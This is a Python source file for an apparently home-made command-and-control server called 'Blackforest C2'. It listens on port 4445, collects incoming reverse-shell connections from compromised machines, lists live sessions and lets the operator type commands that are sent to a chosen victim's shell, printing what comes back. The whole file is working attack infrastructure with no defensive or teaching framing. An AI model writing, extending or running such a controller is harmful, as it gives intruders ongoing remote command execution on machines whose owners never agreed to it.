import socket
import threading
import time

# C2 Configuration
HOST = '0.0.0.0'
PORT = 4445
sessions = [] # List of (client, addr)

def session_handler(client, addr):
    # This thread just ensures the socket is kept alive or monitors status?
    # Actually, for a reverse shell, we only read when 'interacting'.
    # But checking if it's dead is good.
    pass

def accept_connections():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
    except OSError:
        print(f"[!] Port {PORT} busy. Kill the old process.")
        return

    server.listen(5)
    
    while True:
        try:
            client, addr = server.accept()
            sessions.append({"client": client, "addr": addr})
            print(f"\n[+] New Session ({len(sessions)-1}) from {addr[0]}")
            print("C2> ", end="", flush=True) # Re-print prompt
        except:
            break

def interact(session_id):
    if session_id < 0 or session_id >= len(sessions):
        print("[-] Invalid Session ID")
        return
        
    target = sessions[session_id]
    client = target["client"]
    addr = target["addr"]
    
    print(f"[*] Entering Shell {session_id} ({addr[0]}). Type 'back' to return.")
    
    # Start a receiver thread for THIS session
    stop_event = threading.Event()
    
    def recv_loop():
        while not stop_event.is_set():
            try:
                data = client.recv(4096)
                if not data: 
                    print("\n[-] Connection Lost.")
                    stop_event.set()
                    break
                print(data.decode('utf-8', errors='ignore'), end='', flush=True)
            except:
                break
                
    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()
    
    # Input Loop
    while not stop_event.is_set():
        try:
            cmd = input("")
            if cmd.strip() == "back":
                stop_event.set()
                print("[*] Backgrounding session...")
                break
                
            client.send((cmd + "\n").encode('utf-8'))
        except:
            break
            
    # We don't close the client when leaving interaction!

def start_c2():
    print(f"[*] Blackforest C2 Started on {PORT}")
    print("[*] Type 'help' for commands.")
    
    # Start Accepter Thread
    t = threading.Thread(target=accept_connections, daemon=True)
    t.start()
    
    while True:
        try:
            cmd = input("C2> ").strip().split()
            if not cmd: continue
            
            if cmd[0] == "list":
                print("\n--- Active Sessions ---")
                for i, s in enumerate(sessions):
                    try:
                        # Check if alive (simple peek)
                        s["client"].setblocking(False)
                        try:
                            d = s["client"].recv(1, socket.MSG_PEEK)
                            if d == b'': raise Exception
                        except BlockingIOError: pass
                        s["client"].setblocking(True)
                        
                        print(f"[{i}] {s['addr'][0]}:{s['addr'][1]}")
                    except:
                        print(f"[{i}] {s['addr'][0]} (DEAD)")
                print("-----------------------")
                
            elif cmd[0] == "interact":
                if len(cmd) < 2:
                    print("Usage: interact <id>")
                else:
                    interact(int(cmd[1]))
            
            elif cmd[0] == "help":
                print("Commands: list, interact <id>, exit")
                
            elif cmd[0] == "exit":
                print("[*] Shutting down...")
                break
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    start_c2()
